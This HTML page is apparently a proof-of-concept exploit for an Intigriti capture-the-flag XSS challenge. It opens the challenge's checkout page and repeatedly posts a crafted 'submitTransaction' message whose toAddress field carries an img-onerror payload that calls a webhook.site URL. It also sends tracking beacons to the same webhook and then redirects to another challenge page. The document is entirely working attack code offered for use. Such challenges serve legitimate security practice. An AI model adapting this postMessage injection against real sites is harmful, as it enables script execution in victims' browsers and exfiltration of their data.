<html>
<body>
    <script>
        const win = window.open("https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=0.00000001", "_blank");
        const xssPayload = '"><img src=x onerror="fetch(`https://webhook.site/963c1110-c016-402c-8258-3f38833936f3/XSS_SUCCESS`)"><"';
        const payload = {
            type: "submitTransaction",
            transaction: {
                toAddress: xssPayload,
                currency: '1337COIN',
                amount: 1337
            }
        };

        const interval = setInterval(() => {
            if (win) {
                fetch(`https://webhook.site/963c1110-c016-402c-8258-3f38833936f3/windowisopened`);
                win.postMessage(payload, "*");
            }
        }, 1000);
        
        setTimeout(() => {
            fetch(`https://webhook.site/963c1110-c016-402c-8258-3f38833936f3/redirected`);
            window.location.href = "https://challenge-0126.intigriti.io/marketwatch.html";
        }, 5000);
    </script>
</body>
</html>
